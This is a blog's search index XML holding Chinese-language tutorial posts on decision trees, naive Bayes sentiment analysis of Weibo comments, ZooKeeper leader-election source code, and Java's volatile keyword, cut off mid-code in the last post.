<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[决策树分类算法]]></title>
    <url>%2F2018%2F11%2F24%2F%E5%86%B3%E7%AD%96%E6%A0%91%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[决策树简介机器学习中，决策树是一个预测模型；他代表的是对象属性与对象值之间的一种映射关系。树中每个节点表示某个对象，而每个分叉路径则代表某个可能的属性值，而每个叶节点则对应从根节点到该叶节点所经历的路径所表示的对象的值。决策树仅有单一输出，若欲有复数输出，可以建立独立的决策树以处理不同输出。 数据挖掘中决策树是一种经常要用到的技术，可以用于分析数据，同样也可以用来作预测。 决策树学习也是数据挖掘中一个普通的方法。在这里，每个决策树都表述了一种树型结构，它由它的分支来对该类型的对象依靠属性进行分类。每个决策树可以依靠对源数据库的分割进行数据测试。这个过程可以递归式的对树进行修剪。 当不能再进行分割或一个单独的类可以被应用于某一分支时，递归过程就完成了。 在分类算法中，决策树每个非叶节点表示一个特征属性上的测试，每个分支代表这个特征属性在某个值域上的输出，而每个叶节点存放一个类别。使用决策树进行决策的过程就是从根节点开始，测试待分类项中相应的特征属性，并按照其值选择输出分支，直到到达叶子节点，将叶子节点存放的类别作为决策结果。 实例说明问题描述：目前抽取了西瓜的部分属性，包括[纹理，根蒂，触感，色泽]，并挑选了部分西瓜，对每个西瓜的属性进行记录，现在希望通过之前的西瓜样本，构建出一个经验决策树，能够判断一个西瓜是否好吃。 决策树如何构建这个问题可以换个方式考虑，在决策树简介中的那棵决策树中，为什么我们首先判断西瓜的纹理，在左子树中为什么先判断根蒂而在右子树中判断触感。为了解释这个问题，需要引出一个新的概念信息熵，一条信息的信息量大小和它的不确定性有直接的关系，要搞清楚一件不确定的事，需要了解大量信息。熵(entropy)用于表示随机变量不确定性的度量, 如果熵越大，表示不确定性越大。 假设变量X，它有Xi（i=1,2,3…n）种情况，pi表示第i情况的概率，那么随机变量X的熵定义为:比如当随机变量X只有0,1两种取值，则有: H(x) = -plog(p) - (1-p)log(1-p) , 可以画出一个二维坐标表示他们的关系:从而可知，当 p=0.5 时，熵取值最大，随机变量不确定性最大。从常识上可以解释为，当只有两种可能时，当两种可能概率相同，我们就很难判断哪个事件会发生，而如果其中有一个概率非常小，另一个概率非常大，那么我们就有很大的把握去判断大概率事件会发生。前者是不确定性大，后者是确定性大。 由此继续延伸条件熵：随机变量X给定的条件下，随机变量Y的条件熵 H(Y|X) 定义为信息增益：得知特征X的信息而使得分类Y的信息的不确定性减少的程度。如果某个特征的信息增益比较大，就表示该特征对结果的影响较大，特征A对数据集D的信息增益表示为 我们通过西瓜的数据分别解释每个概念信息熵：info(D) = -P(是)logP(是) - P(否)logP(否) = I(8,9)条件熵：info(D|纹理) = P(清晰)I(7,2) + P(稍糊)I(1,5) + P(模糊)I(0,3)信息增益：gain(纹理) = info(D) - info(D|纹理) 决策树归纳算法(ID3)构建决策树ID3算法的核心是在决策树的各个结点上应用信息增益准则进行特征选择。具体做法是： 从根节点开始，对结点计算所有可能特征的信息增益，选择信息增益最大的特征作为结点的特征，并由该特征的不同取值构建子节点； 对子节点递归地调用以上方法，构建决策树； 直到所有特征的信息增益均很小或者没有特征可选时为止。 递归划分步骤仅当下列条件之一成立停止： (a) 给定结点的所有样本属于同一类。 (b) 没有剩余属性可以用来进一步划分样本。在此情况下，使用多数表决。这涉及将给定的结点转换成树叶，并用样本中的多数所在的类标记它。替换地，可以存放结点样本的类分布。 (c) 分枝，当所有特征的信息增益都很小，也就是没有再计算的必要了，就创建一个树叶，也是用多数表决。 ID3基于信息增益的概念，但算法存在一定的问题，如果某个属性取值很多时条件熵就会很小，在递归构建决策树时选择决策属性会很麻烦，多个属性之间的信息增益没有显著的数量级上的差距，此时选取最大值往往是一种赌博。此外如果属性是比较连续的值，ID3的方法是不同的值分开计算，这是ID3的缺点，可以改进的方法是按照一定的规律划定一定的区间，一个区间看作一种属性值。针对决策树，还有许多改进的方法去更好的构建决策树，诸如C4.5等，这里不做细讲。 决策树的优缺点 优点 决策树易于理解和解释，可以可视化分析，容易提取出规则。 可以同时处理标称型和数值型数据。 测试数据集时，运行速度比较快。 决策树可以很好的扩展到大型数据库中，同时它的大小独立于数据库大小。 缺点 对缺失数据处理比较困难。 容易出现过拟合问题。 忽略数据集中属性的相互关联。 ID3算法计算信息增益时结果偏向数值比较多的特征。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分类算法</tag>
        <tag>数据挖掘</tag>
        <tag>信息熵</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[朴素贝叶斯分类算法]]></title>
    <url>%2F2018%2F11%2F22%2F%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[分类问题维基百科定义：分类问题是机器学习非常重要的一个组成部分，它的目标是根据已知样本的某些特征，判断一个新的样本属于哪种已知的样本类。分类问题也被称为监督式学习(supervised learning)，根据已知训练区提供的样本，通过计算选择特征参数，建立判别函数以对样本进行的分类。 与之相对的称为非监督式学习(unsupervised learning)，也叫做聚类分析。 数学定义：已知集合C = {y1,y2,...ym}和I = {x1,x2,...xn}，确定映射规则y = f(x)，使得任意xi ∈ I有且仅有一个yi ∈ C ,使得yi ∈ f(xi)成立。 在用户画像、NLP、预测、推荐等领域都需要研究分类问题。诸如NLP中情感分析，需要通过分类算法来分析文本的情感极性，这对于舆论监督有很好的帮助。 朴素贝叶斯分类算法综述贝叶斯分类算法是一类算法的总称，这类算法都是以贝叶斯定理为基础，故统称贝叶斯分类算法。其中朴素贝叶斯分类算法是贝叶斯分类算法中最简单、最常见的一种分类方法。 贝叶斯分类算法核心便是概率论中的贝叶斯公式1P(B|A) = P(A|B)P(B)/P(A) 其中P(B|A)是指在事件A发生的情况下事件B发生的概率。在贝叶斯定理中，每个名词都有约定俗成的名称： P(A|B)是已知B发生后A的条件概率，也由于得自B的取值而被称作A的后验概率。 P(A)是A的先验概率（或边缘概率）。之所以称为”先验”是因为它不考虑任何B方面的因素。 P(B|A)是已知A发生后B的条件概率，也由于得自A的取值而被称作B的后验概率。 P(B)是B的先验概率或边缘概率。 贝叶斯公式推导: 那朴素贝叶斯算法如何使用贝叶斯定理呢？将贝叶斯公式中的变量换成实体可有 例子分析给定如下苹果数据 编号 大小 颜色 形状 好吃 1 小 青色 非规则 否 2 大 红色 非规则 是 3 大 红色 圆形 是 4 大 青色 圆形 否 5 大 青色 非规则 否 6 小 红色 圆形 是 7 大 青色 非规则 否 8 小 红色 非规则 否 9 小 青色 圆形 否 10 大 红色 圆形 是 现在我在超市看见一个苹果又大又红又圆，现在预测好不好吃。那么分析成数学问题就是P(好吃|大、红、圆)与P(不好吃|大、红、圆)谁更大。123456789P(好吃|大、红、圆) = P(大、红、圆|好吃)P(好吃) / P(大、红、圆) = P(大|好吃)*P(红|好吃)*P(圆|好吃)*P(好吃) / P(大、红、圆) = (3/4) * (4/4) * (3/4) * (4/10) / P(大、红、圆) = (144/640) / P(大、红、圆)P(不好吃|大、红、圆) = P(大、红、圆|不好吃)P(不好吃) / P(大、红、圆) = P(大|不好吃)*P(红|不好吃)*P(圆|不好吃)*P(不好吃) / P(大、红、圆) = (3/6) * (1/6) * (2/6) * (6/10) / P(大、红、圆) = (36/2160) / P(大、红、圆) 所有根据朴素贝叶斯算法计算得到在训练样本中P(好吃|大、红、圆)大于P(不好吃|大、红、圆)，因此做出判断，又大又红又圆的苹果好吃。 根据上述计算过程可以发现，某个子属性的概率可能为0,例如 P(红|不好吃)可能为零，那么整个概率就为0。为了规避这个问题，在体量较大的样本训练中，为每一个子属性的样本数+1，在结果上的影响不大。 利用朴素贝叶斯对文本进行简单的情感分析在网络环境中充斥着许多文本信息，此次情感分析问题细化到一个真实场景：当一个官方微博帐号发布了一则消息，官方希望能够通过程序自动分析出微博留言的情感與情。 问题分析对问题进行分析，在这个问题中，程序需要获取的文本单位为一条留言，通常微博留言文本词量偏小，通常保持在50字以内。因此我们将每一条留言当作一个样本，我们只关心留言内容，对发表留言的时间、用户等属性不考虑，那么如何抽象文本信息属性呢？在留言中存在比较大量无效的停顿词，我们获取文本信息往往从关键的词语上获取，因此我们对文本进行关键词提取，然后组建一个留言的关键词向量，每个关键词都是文本的属性，由此我们就可以构建像上述例子的属性表，同时在训练样本中，我们根据自己的直觉对样本的每一条数据做个情感极性判断，主要的极性判断为消极情感和积极情感，然后利用朴素贝叶斯对测试样本进行分类。具体步骤如下： 下载微博留言数据 判断训练样本中每条留言的情感极性,并去除标点符号和特殊符号 利用HanLP对留言进行关键词提取，最多提取10个关键词 构建关键词与情感极性的稀疏矩阵(存在留言关键词不及10个的情况) 对测试样本进行关键词提取，利用贝叶斯公式分别计算两个情感极性的概率 将测试样本的情感极性归于概率较大的类别 问题过程示例现在挑选皇族电子竞技俱乐部在2018年11月18日下午4点发布的一则微博的评论部分数据12345671. 加油加油！！2. s8打的完全不配赢是真的，整个18年的努力和荣誉也是真的，吹rng牛逼是真的，骂rng辣鸡也是真的。 想再劈头盖脸骂一顿是真的，希望19年可以重拾荣耀也是真的。3. RNG加油，面对未来的征程，皇族永不言弃。4. 一次失利不是世界末日，如今深处低谷，冷眼和嘲笑难免，但请记得低头看看胸口的队名，勿言弃，勇前行！S9加油！5. 假视频终于做好了，配合假语音，加上IG夺冠也把你们从风口浪尖的位置放下来了，是时候出来洗白了。我这一看评论全是rng加油，公关没少花吧？分给你们多少钱？香锅没人挡子弹的事那一段怎么播？语音在哪呢请告诉我？整这么一段花里胡哨的玩意有用？6. 许少年1999：挨骂就挨骂吧。就好像你是家里最大的希望，高考却连二本都没上。挨骂是应该的，可是谁还不允许你复考了？RNG加油，RNG牛逼！7. 明年的纪录片要彩色的！要最后大家一起喝彩的！要能让我笑着看完的！！！ 对数据进行处理，获取每条留言的关键词，并构建稀疏矩阵 关键词 关键词 关键词 关键词 关键词 关键词 关键词 关键词 关键词 关键词 情感词性 加油 积极 努力 荣誉 辣鸡 披头盖脸 重拾荣耀 牛逼 积极 加油 未来 征程 皇族 用不言弃 积极 失利 世界末日 深处 低谷 冷眼 嘲笑 胸口 队名 勿言弃 前行 积极 假 配合 风口浪尖 洗白 加油 公关 子弹 语音 花里胡哨 消极 挨骂 希望 高考 二本 不允许 加油 牛逼 积极 明年 纪录片 彩色 喝彩 笑 积极 别问我为什么取的都是积极的。。。。。。我要保持积极!!! 然后对一条留言进行测试11. 你们接着打我就接着看！加油！我们等你！ =&gt; [接着打，接着看，加油，等你] 再计算P(积极|接着打、接着看、加油、等你)和P(消极|接着打，接着看，加油，等你)并比较大小得出结论，123456789P(积极|接着打、接着看、加油、等你) = P(接着打、接着看、加油、等你|积极)*P(积极) / P(接着打、接着看、加油、等你) = P(接着打|积极)*P(接着看|积极)*P(加油|积极)*P(等你|积极)*P(积极) / P(接着打、接着看、加油、等你) = [(0+1)/(6)]*[(0+1)/(6)]*(3/6)*[(0+1)/(6)]*(6/7) / P(接着打、接着看、加油、等你) = (18/9072) / P(接着打、接着看、加油、等你)P(消极|接着打、接着看、加油、等你) = P(接着打、接着看、加油、等你|消极)*P(消极) / P(接着打、接着看、加油、等你) = P(接着打|消极)*P(接着看|消极)*P(加油|消极)*P(等你|消极)*P(消极) / P(接着打、接着看、加油、等你) = [(0+1)/1]*[(0+1)/1]*(1/1)*[(0+1)/1]*(1/7) / P(接着打、接着看、加油、等你) = (1/7) / P(接着打、接着看、加油、等你) 这不是打脸了吗？仔细分析，问题有两个，第一我们选取的样本中消极太少权重太小，单条记录对结果影响太大，因此对训练样本的选取很重要;第二，我们所选择的总样本数量太少，而这样的文本分析应该是基于大数据来分析的 问题 在关键词提取后，仍然发现有诸如[高考，皇族，队名，配合]等词语对情感极性判断没有太大的影响，但会在一段时间高频出现，如果将这些词与真正表示情感的词化作同等权重来计算，也会影响计算结果。 解决办法：构建一个情感词权重词典，通过词典对关键词向量进行二次特征提取，以求获取更加精准的判断效果 面对大数据文本时人为判断训练样本的情感词极性是一个繁重的活 这是文本分析比较普遍的问题，有效样本越多，算法结果越精准。但是我们可以谨慎选择一个比较合理的基础训练样本，计算未知样本的情感极性，分类结束后，我们将样本加入到训练样本中，迭代式的增加样本数量。为什么说是谨慎的选择呢，从上面的例子可以看到，原本的基础训练样本影响到后面添加进来的样本，如果基础训练样本不合理，随着迭代次数的增加，整个训练样本会越来越不合理。 在大数据集上的计算困难，利用原始的方式非常困难 利用现有的文本引擎工具Elasticsearch能够很好的解决这个问题。 在这个问题分析过程中，我们默认了我们使用的HanLP关键词提取能够提取到我们想要的关键词，但事实关键词提取也是一个非常困难的问题，对这类的研究也很复杂，而我们的情感分析的准确度也高度依赖关键词提取效果。 HanLP的分词、关键词提取也高度依赖了背后的分词词典，随着网络信息传播，往往会出现新的词汇，我们需要定时的收集新词汇，添加到HanLP的分词字典中(可以想要这个要求是很合理的，我们在理解网络词汇的时候也是不断学习的，因此没有理由让分词词典一成不变) ElasticsearchElasticsearch是NLP研究过程中非常强大的工具，它类似关系性数据库，拥有数据库(index)，数据库中有表(type)，表上有属性(字段)。但是不同的是Elasticsearch可以为每个字段建立的索引，这个索引不同于mysql的B+树，而是倒排索引，这个索引记录一个字段的所有直，并记录每个值出现在那些记录里里面。在我们使用朴素贝叶斯计算时，想要获取某个条件下的概率，只需要编写简单的查询语句就可以得出结果，而这个搜索引擎可以在PB级数据量上进行秒级查询。 Elasticsearch索引设计： 提取留言文本关键词，关键词作为一条记录的字段名，字段名的值为情感权值，同时还有一个训练样本的感情极性字段，例如s8打的完全不配赢是真的，整个18年的努力和荣誉也是真的，吹rng牛逼是真的，骂rng辣鸡也是真的。 想再劈头盖脸骂一顿是真的，希望19年可以重拾荣耀也是真的。的存储模式为：1&#123;id:1, 努力:4, 荣誉:2，辣鸡:1/4，披头盖脸:1/2，重拾荣誉:2，牛逼:2，极性:"积极"&#125; 请注意当一个词语对最后的情感结论是负作用，那么这个词根据情感词典的权值取权值的倒数 对一条测试样本，测试样本如上述步骤进行关键词提取，通过Elasticsearch查询语句获取贝叶斯定理中的概率，计算积极和消极概率得出结论。(得出结论后也可以将新样本加进训练样本) 朴素贝叶斯分类算法的优缺点优点 对大数量训练和查询时具有较高的速度。即使使用超大规模的训练集，针对每个项目通常也只会有相对较少的特征数，并且对项目的训练和分类也仅仅是特征概率的数学运算而已。 朴素贝叶斯模型发源于古典数学理论，有稳定的分类效率。 支持增量式运算。即可以实时的对新增的样本进行训练。 朴素贝叶斯对结果解释容易理解。 缺点 由于使用了样本属性独立性的假设，所以如果样本属性有关联时其效果不好。 理论上，朴素贝叶斯模型与其他分类方法相比具有最小的误差率。但是实际上并非总是如此，这是因为朴素贝叶斯模型给定输出类别的情况下,假设属性之间相互独立，这个假设在实际应用中往往是不成立的，在属性个数比较多或者属性之间相关性较大时，分类效果不好。而在属性相关性较小时，朴素贝叶斯性能最为良好。对于这一点，有半朴素贝叶斯之类的算法通过考虑部分关联性适度改进。 由于我们是通过先验和数据来决定后验的概率从而决定分类，所以分类决策存在一定的错误率。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分类算法</tag>
        <tag>数据挖掘</tag>
        <tag>Elasticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zookeeper Leader选举源码解析]]></title>
    <url>%2F2018%2F10%2F12%2FZookeeperLeaderElection%2F</url>
    <content type="text"><![CDATA[Zookeeper简介Zookeeper 是Apache Hadoop开源项目中的子项目，提供了一个分布式的协调服务框架。Zookeeper暴露了一组简单的操作原语(Primitive)集合，分布式应用能够基于这些原语实现更加高层的服务，包括同步机制、配置管理、服务器集群管理和统一命名服务等。 作为一个分布式的服务框架，Zookeeper主要解决分布式集群中应用系统的一致性问题，它采用类似文件系统目录的节点树的结构作为数据存储模型，并对已存储数据的状态变化进行维护和监控，通过监控这些数据状态的变化实现基于数据的集群管理。 Zookeeper 采用服务器集群的方式提供基本服务，服务器集群成为组，组中的成员具有两种角色，即一个唯一的领导者和若干个成员服务器，组能够为多个客户端提供服务。 Zookeeper角色Zookeeper中的角色主要有以下几种 角色 角色说明 领导者(Leader) Leader不接受客户端的请求，负责进行投票的发起和决议，最终更新状态 学习者(Learner)-跟随着(Follower) Follower用于接收客户请求并向客户端返回结果，在选举过程中参与投票 学习者(Learner)-观察者(Obserber) Observer可以接收客户端连接，将写请求转发给Leader节点。但它不参与投票过程，只同步Leader的状态。Observer的目的是为了扩展系统，提高读取速度 客户端(Client) 请求发起方 Zookeeper 工作原理Zookeeper服务有两种不同的运行模式。一种是“独立模式”，即只有一个Zookeeper服务器。这种模式较为简单，比较适合测试环境，但不能保证高可用性和恢复性。在实际应用中，Zookeeper通常以“复制模式”运行在一个计算机集群上。Zookeeper通过复制来实现高可用性，只要集群中半数以上的机器处于可用状态，它就能提供服务。也就是说，在一个有2n+1节点的集群中，任意n台机器出现故障，都可以保证服务继续，因为剩下的n+1台超过了半数。出于这个原因，一个集群通常包含奇数台机器。 从概念上说，Zookeeper非常简单：它所做的就是确保对znode树的每一个修改都会被复制到集群中超过半数的机器上。如果少于半数的机器出现故障，则最少有一台机器会保存最新状态。其余的副本最终也会更新到这个状态。为了实现这个想法，Zookeeper使用了Azb协议。Zab协议包含两个可以无限重复的阶段： 阶段一: 当服务启动或者Leader崩溃后，Zab就进入了阶段1。当Leader被选举出来，且超过半数(或指定数量)的Learner完成了和Leader的状态同步以后，阶段1就结束了。状态同步保持了Leader和其他服务器具有相同的系统状态。阶段二: 原子广播所有的写请求都被转发给Leader，再有Leader将更新广播给Learner。当半数以上的Follower已经将修改持久化以后，Leader才会提交这个更新，然后客户端才会收到一个更新成功的响应。这个用来达成共识的协议被设计成具有原子性，因此每个修改要么成功，要么失败。 Zookeeper Leader选举源码Zookeeper 中QuorumPeer类出于源码“中心”位置，它与多个类关联，负责管理quorum协议。QuorumPeer继承自Thread，是集群环境下Zookeeper服务器的主线程类。它有4种状态： LOOKING、FOLLOWING、LEADING和OBSERVING，由成员state标识:1234// src/java/main/org/apache/zookeeper/server/quorum/QuorumPeer.javapublic enum ServerState &#123; LOOKING, FOLLOWING, LEADING, OBSERVING; &#125; 这4中状态决定了QuorumPeer的行为，即在集群中充当什么角色。state的初始状态是LOOKING，意思是寻找Leader服务器。一旦选举出Leader，QuorumPeer就切换自身状态，修改state的值，同时实例化对应的服务器控制类。服务器控制类有3种，Leader、Follower和Observer，它们作为QuorumPeer成员对象存在。 前面废话了这么多现在正式进入正题。。。。。。 QuorumPeer类有一个属性成员electionAlg，它是Election接口类型。服务器启动时，根据配置信息决定Election的具有实现类，指定选举算法。Election共有两个抽象方法1234public interface Election &#123; public Vote lookForLeader() throws InterruptedException; public void shutdown();&#125; 其中lookForLeader()是核心方法，返回一个Vote类型对象，标识被推荐服务器。Election的实现类有LeaderEletcion、FastLeaderElection、AuthFastLeaderElection。它们之间的区别在于通信机制以及lookForLeader的算法实现。由于源码中已经表示LeaderElection和AuthFastLeaderElection已经在3.4.0版本被弃用，因此在这里主要看FastLeaderElection。 FastLeaderElection有3个内部线程类: Listener、SendWorker、RecvWorker。Listener线程新建ServerSocketChannel，监听选举端口，一旦接收到连接请求，调用receiveConnection方法，启动发送线程SendWorker和接收线程RecvWorker。 LookForLeader详细源码123456synchronized(this)&#123; logicalclock++; updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());&#125;sendNotifications(); 原子性操作，Leader选举开始每个节点投自己一票，其中getInitId()、getInitLastLoggedZxid()、getPeerEpoch()表示当前self节点的状态，然后将投票结果send给其他节点。接下来就循环交换投票信息，直到找到Leader节点。123456789101112131415161718192021while ((self.getPeerState() == ServerState.LOOKING) &amp;&amp; (!stop)) &#123; /* * 从投票消息队列中接收一条消息 */ Notification n = recvqueue.poll(notTimeout, TimeUnit.MILLISECONDS); if (n == null) &#123;...&#125; /* * 检查n节点是不是参与投票的节点，只有PeerType=PARTICIPANT的节点消息才会参与投票 * Observers are not contained in this view, only nodes with * PeerType=PARTICIPANT. */ else if(self.getVotingView().containsKey(n.sid)) &#123; switch (n.state) &#123; case LOOKING: 跟自己的投票比较。 case OBSERVING: 没有操作 case FOLLOWING: case LEADING: 当已经收到LEADING和FOLLOWING表示已经票选出Leader，然后投最后一票给Leader，结束投票 default: 没有操作 &#125;&#125; 分别看LOOKING和FOLLOWING、LEADING干了什么LOOKING在干的事情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/* * 表示投票轮次大于本节点记录的轮次，表示自己已经落后投票了，将自己的 * 投票轮次设置为最新的，清空自己的票箱，这个票箱记录了集群中其他节点 * 的投票结果 */if (n.electionEpoch &gt; logicalclock) &#123; logicalclock = n.electionEpoch; recvset.clear(); /* * 将n节点的投票结果与自己的投票结果比较,如果投票比自己的投票合理， * 更新自己的投票，否则还是投自己 */ if(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch, getInitId(), getInitLastLoggedZxid(), getPeerEpoch())) &#123; updateProposal(n.leader, n.zxid, n.peerEpoch); &#125; else &#123; updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch()); &#125; // 发送自己的投票结果 sendNotifications();&#125; else if (n.electionEpoch &lt; logicalclock) &#123; // 投票轮次比自己记录的轮次小，说明这个投票已经过时，不处理 break;&#125; else if (totalOrderPredicate(n.leader, n.zxid, n.peerEpoch, proposedLeader, proposedZxid, proposedEpoch)) &#123; // 如果是一个轮次，将n节点的投票与自己比较，如果投票更合理，更新投票 updateProposal(n.leader, n.zxid, n.peerEpoch); sendNotifications();&#125;// 将n节点的投票记录下来recvset.put(n.sid, new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));/* * 在自己的票箱中查看自己投票的节点是否已经被集群中一半以上的 * 节点认可了，如果已经有一半以上的节点认可，则结束选举 */if (termPredicate(recvset, new Vote(proposedLeader, proposedZxid, logicalclock, proposedEpoch))) &#123; // Verify if there is any change in the proposed leader // 这里没太理解， while((n = recvqueue.poll(finalizeWait, TimeUnit.MILLISECONDS)) != null)&#123; if(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch, proposedLeader, proposedZxid, proposedEpoch))&#123; recvqueue.put(n); break; &#125; &#125; /* * This predicate is true once we don't read any new * relevant message from the reception queue */ if (n == null) &#123; self.setPeerState((proposedLeader == self.getId()) ? ServerState.LEADING: learningState()); Vote endVote = new Vote(proposedLeader, proposedZxid, logicalclock, proposedEpoch); leaveInstance(endVote); return endVote; &#125;&#125; 其中没有说清楚接收的投票如何和自己的投票比较的，也就是totalOrderPredicate方法的实现1234567891011121314151617protected boolean totalOrderPredicate(long newId, long newZxid, long newEpoch, long curId, long curZxid, long curEpoch) &#123; if(self.getQuorumVerifier().getWeight(newId) == 0)&#123; return false; &#125; /* * We return true if one of the following three cases hold: * 1- New epoch is higher * 2- New epoch is the same as current epoch, but new zxid is higher * 3- New epoch is the same as current epoch, new zxid is the same * as current zxid, but server id is higher. */ return ((newEpoch &gt; curEpoch) || ((newEpoch == curEpoch) &amp;&amp; ((newZxid &gt; curZxid) || ((newZxid == curZxid) &amp;&amp; (newId &gt; curId)))));&#125; 可以看出，比较的顺序是Epoch、zxid、Id，优先选投票轮次高的，投票轮次相同选Zxid高的，Zxid相同选id高的，因此在Zookeeper启动的时候，往往id高的获得Leader，但不绝对，比如在5个节点的集群中，启动顺序分别是1-&gt;2-&gt;3-&gt;4-&gt;5，当票选到节点3时已经票选超过半数，那么后面启动的4和5就直接成为follower 接下来再分析FOLLOWING和LEADING1234567891011121314151617181920212223242526272829303132if(n.electionEpoch == logicalclock)&#123; recvset.put(n.sid, new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch)); // 如果推举的Leader是自己，把自己的状态改为LEADING if(ooePredicate(recvset, outofelection, n)) &#123; self.setPeerState((n.leader == self.getId()) ? ServerState.LEADING: learningState()); Vote endVote = new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch); leaveInstance(endVote); return endVote;&#125;/* * 确定Leader之前要保证半数以上的节点已经成为follower * Before joining an established ensemble, verify * a majority is following the same leader. */outofelection.put(n.sid, new Vote(n.version, n.leader, n.zxid, n.electionEpoch, n.peerEpoch, n.state));if(ooePredicate(outofelection, outofelection, n)) &#123; synchronized(this)&#123; logicalclock = n.electionEpoch; self.setPeerState((n.leader == self.getId()) ? ServerState.LEADING: learningState()); &#125; Vote endVote = new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch); leaveInstance(endVote); return endVote;&#125; 这里需要解释一下ooePredicate1234567891011121314151617181920212223242526/** * This predicate checks that a leader has been elected. It doesn't * make a lot of sense without context (check lookForLeader) and it * has been separated for testing purposes. * 有两个map，一个表示收到的投票集合，一个表示LEADING状态节点和FOLLOWING节点的投票 * 集合，这里要确定两个条件：一个是在收到的LOOKING节点中半数认为n节点应该是Leader * 另一个是LEADING节点必须告诉其他节点自己是LEADING状态，避免一直投票 * * @param recv map of received votes * @param ooe map containing out of election votes (LEADING or FOLLOWING) * @param n Notification * @return */protected boolean ooePredicate(HashMap&lt;Long,Vote&gt; recv, HashMap&lt;Long,Vote&gt; ooe, Notification n) &#123; return (termPredicate(recv, new Vote(n.version, n.leader, n.zxid, n.electionEpoch, n.peerEpoch, n.state)) &amp;&amp; checkLeader(ooe, n.leader, n.electionEpoch));&#125; 再来看一下checkLeader12345678910111213141516171819202122232425262728293031323334/** * In the case there is a leader elected, and a quorum supporting * this leader, we have to check if the leader has voted and acked * that it is leading. We need this check to avoid that peers keep * electing over and over a peer that has crashed and it is no * longer leading. * * @param votes set of votes * @param leader leader id * @param electionEpoch epoch id */ protected boolean checkLeader( HashMap&lt;Long, Vote&gt; votes, long leader, long electionEpoch)&#123; boolean predicate = true; /* * If everyone else thinks I'm the leader, I must be the leader. * The other two checks are just for the case in which I'm not the * leader. If I'm not the leader and I haven't received a message * from leader stating that it is leading, then predicate is false. */ if(leader != self.getId())&#123; if(votes.get(leader) == null) predicate = false; else if(votes.get(leader).getState() != ServerState.LEADING) predicate = false; &#125; else if(logicalclock != electionEpoch) &#123; predicate = false; &#125; return predicate; &#125; FastLeaderElection源码分析完了，总结一下：首先，每个节点先给自己投票，然后将投票信息发送给集群中的其他节点；每个节点收到其他节点的投票，放在投票队列中，从队列中提取投票，跟自己的投票比较，如果投票更合理，就替换自己的投票，否则不改变自己的投票。然后检测自己当前的投票是否相同于集群半数以上的节点，如果相同于半数以上投票，则判断这个投票是不是投的自己，如果是投的自己，则改变自己的状态为LEADING，否则改为FOLLOWING或者OBSERVER，最后返回最后的投票，并结束LookForLeader。]]></content>
      <categories>
        <category>分布式计算</category>
      </categories>
      <tags>
        <tag>Zookeeper</tag>
        <tag>FastLeaderElection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java volatitle]]></title>
    <url>%2F2018%2F05%2F03%2FJavaVolatitle%2F</url>
    <content type="text"><![CDATA[Java Volatile KeywordJava volatitle关键字用来标记变量”被存储在主存里”，更精确的说，volatitle变量的每一次读取都需要从计算机的主存读取而不是CPU Cache，而每一次写入都是直接写入主存，而不是CPU Cache。从Java 5开始volatitle关键字不仅仅是保证写入主存和从主存读取。 变量可见性问题Java volatitle保证了变量跨线程的可见性，这么说可能有点抽象，so let me elaborate。 在线程操作non-volatile变量的多线程应用中，由于性能原因每个线程会从主存中拷贝变量到CPU Cache(each thread may copy variables from main memory into a CPU cache while working on them)。如果你的计算机是多CPU的，每个线程可能跑在不同的CPU上，这意味着每个线程会拷贝变量到不同CPU的Cache中，就像这样: 对于JVM来说，从主存读取值到CPU Cache和从CPU Cache写入数据到主存，non-volatile variables没有上述的保证，会引出一些问题。 设想一种情况，两个或更多线程可以访问包含一个计数器变量的共享对象，声明如下:12345public class SharedObject &#123; public int counter = 0;&#125; 再想象一下，只有Thread 1 increments the counter variable，但是Thread 1 和Thread 2都会一遍一遍的读取counter 变量。如果counter变量没有volatitle修饰，那么就不保证counter变量的值何时从CPU Cache写入主存。这就意味着在CPU Cache中counter的值与主存里的值可能不一样，就像这样: 这个问题就是线程不能看到变量的最新值，因为在另一个线程中没有将变量最新值写入到主存中，这个问题叫做可见性问题。一个线程的更新对另一个线程不可见。 Java volatitle可见性保证Java关键字volatitle旨在解决变量可见性问题。定义了counter变量volatitle后线程的写入操作会立刻写入到主存，同时所有的读取都是直接从主存读取。下面就是volatitle定义counter变量:12345public class SharedObject &#123; public volatile int counter = 0;&#125; 定义了volatitle后就保证了变量的可见性，在上述的情况下，线程1修改counter，线程2读取counter，对于线程2来说它能够见到线程1的最新修改。但是当两个线程都要修改counter的时候，定义volatitle显然不够了。 Full volatile Visibility GuaranteeFull保证如下: 如果线程A写入一个volatitle变量，并且线程B随后读取相同的volatitle变量，则在写入volatitle变量之前，线程A可见的所有变量在线程B读取volatitle变量后也将可见。 如果线程A读取一个volatitle变量，则读取volatitle变量时线程A可见的所有变量也将从主内存中重新读取。 可以看到，这个开销是比较恐怖的，首先直接读主存和写主存原本就很慢，慢到几十倍甚至几百倍，同时一个volatitle变量读取会带动其他所有volatitle重新读取，大大降低了性能。 来看一个例子：123456789101112public class MyClass &#123; private int years; private int months private volatile int days; public void update(int years, int months, int days)&#123; this.years = years; this.months = months; this.days = days; &#125;&#125; update()方法会写入三个变量，其中只有days是volatitle，Full volatitle保证意味着，当写入days时，所有的变量都会写入主存。在这个例子中就是，当我们要写入days时，years和months也要写入主存。当要读取years、months和days时，你可以像这样做:123456789101112131415161718public class MyClass &#123; private int years; private int months private volatile int days; public int totalDays() &#123; int total = this.days; total += months * 30; total += years * 365; return total; &#125; public void update(int years, int months, int days)&#123; this.years = years; this.months = months; this.days = days; 